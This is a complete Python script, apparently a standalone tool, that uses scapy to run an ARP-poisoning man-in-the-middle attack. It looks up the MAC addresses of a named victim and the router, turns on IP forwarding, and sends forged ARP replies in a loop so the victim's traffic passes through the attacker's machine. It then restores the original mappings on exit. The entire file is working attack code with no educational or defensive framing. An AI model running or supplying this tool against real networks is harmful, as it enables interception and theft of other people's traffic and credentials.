#!/usr/bin/env python3

import sys
import time
import argparse

# Disable scapy startup warnings
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


def arp_reply(dest_ip, src_ip, mac, count=1):
    print("Telling {} that {} is at {}".format(src_ip, dest_ip, mac))
    ARP_REPLY_CODE = 2
    arp = ARP(op=ARP_REPLY_CODE, psrc=src_ip, pdst=dest_ip, hwdst=mac)
    send(arp, verbose=False, count=count)


def get_mac(ip):
    mac = None
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    ans, unans = srp(arp_request, timeout=2, verbose=False)
    if ans:
        first_response = ans[0]
        req, res = first_response
        mac = res.getlayer(Ether).src

    return mac


def get_ip_mac_map(ip_list):
    ip_to_mac_map = {}
    for ip in ip_list:
        ip_to_mac_map[ip] = get_mac(ip)

    return ip_to_mac_map


def set_ip_forwarding(ip_forwarding):
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        if ip_forwarding:
            ipf.write('1\n')
        else:
            ipf.write('0\n')


def arp_spoof(ip1, ip2, mac, interval=10):
    print("ARP Poisoning {} and {} with mac: {}".format(ip1, ip2, mac))
    while 1:
        arp_reply(ip1, ip2, mac)
        arp_reply(ip2, ip1, mac)
        print("Sleeping for {} seconds\n".format(interval))
        time.sleep(interval)


def do_mitm(victim_ip, router_ip, network_interface):
    # Get MAC of this computer
    mac = get_if_hwaddr(network_interface)

    original_macs = get_ip_mac_map([router_ip, victim_ip]) 
    print("Interface: {}".format(network_interface))
    print("Victim ({}) mac: {}".format(victim_ip, original_macs[victim_ip]))
    print("Router ({}) mac: {}".format(router_ip, original_macs[router_ip]))

    set_ip_forwarding(True)
    try:
        arp_spoof(router_ip, victim_ip, mac)
    except KeyboardInterrupt:
        pass
    finally:
        # Restore original mappings
        print("Restoring original macs...")
        arp_reply(router_ip, victim_ip, original_macs[victim_ip], count=3)
        arp_reply(victim_ip, router_ip, original_macs[router_ip], count=3)
        time.sleep(1)
        arp_reply(router_ip, victim_ip, original_macs[victim_ip], count=3)
        arp_reply(victim_ip, router_ip, original_macs[router_ip], count=3)

        set_ip_forwarding(False)
        print("Done")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('victim_ip', type=str,
                        help='IP of the host you want to MITM (router found automatically)')
    parser.add_argument('-r', '--router-ip', type=str, dest='router_ip',
                        help='IP of the router. If not given, it is guessed from the victim ip')
    parser.add_argument('-i', '--interface', type=str, dest='interface', default='wlan0',
                        help='Network interface to use')
    args = parser.parse_args()

    if not args.router_ip:
        # Assume the router is x.y.z.1
        args.router_ip = '.'.join(args.victim_ip.split('.')[0:3])+'.1'

    do_mitm(args.victim_ip, args.router_ip, args.interface)


if __name__ == '__main__':
    main()

